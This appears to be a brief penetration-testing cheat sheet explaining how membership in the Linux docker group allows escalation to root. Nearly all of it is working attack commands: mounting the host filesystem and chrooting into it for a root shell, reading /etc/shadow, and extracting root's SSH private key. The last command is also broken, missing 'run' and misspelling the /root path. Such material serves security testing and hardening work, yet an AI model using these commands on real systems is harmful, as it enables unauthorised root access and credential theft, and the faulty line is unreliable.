# Privilege Escalation via Docker Group Membership

On a linux machine, a membership in `docker` group grants a user full control over the docker daemon. Since, the docker daemon runs as root, a user with the ability to send commands to it can escalate their privileges to root on host machine.

## Get the Root Shell

Mount `/` into a container and `chroot` into it

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```
## Read /etc/shadow

```bash
docker run --rm -v /etc/shadow:/shadow alpine cat /shadow
```

## Steal Root's SSH Keys

```bash
docker --rm -v /roor/.ssh/:/ssh alpine cat /ssh/id_rsa
```

If unencrypted you can log in as root via SSH
